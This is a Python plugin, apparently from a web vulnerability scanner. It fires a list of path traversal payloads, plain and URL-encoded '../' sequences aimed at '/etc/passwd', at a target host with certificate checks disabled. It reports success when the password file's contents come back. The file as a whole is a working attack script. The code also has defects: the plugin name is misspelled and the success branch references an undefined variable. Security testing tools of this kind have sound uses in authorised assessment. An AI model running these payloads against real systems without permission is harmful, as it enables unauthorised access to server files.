from utils.status import *
from .helper import Plugin,utils

class PathTraveral(Plugin):
    def __init__(self):
        self.name        = "Path Traveral"
        self.enable      = True
        self.description = ""

    def presquites(self, host):
        if utils.isalive( utils.uri(host) ):
            return True
        return False

    def main(self,host):
        payloads = [
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
            "../../../../../../../../../../../etc/passwd",
            "static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
            "static/../../../../../../../../../../../etc/passwd",
        ]

        for payload in payloads:

            request = utils.requests.Request(
                method = "GET",
                url    = utils.uri(host),
                
            )
            sess         = utils.requests.Session()
            prepared     = request.prepare()
            sess.verify  = False
            prepared.url = utils.uri(host) + payload
            request      = sess.send(prepared)

            if 'root:x:0:0:root' in request.text:
                return Result(
                    status   = SUCCESS,
                    msg      = poc,
                    request  = utils.dump_request(request),
                    response = utils.dump_response(request)
                )
        
        return Result(FAILED,None,None,None) 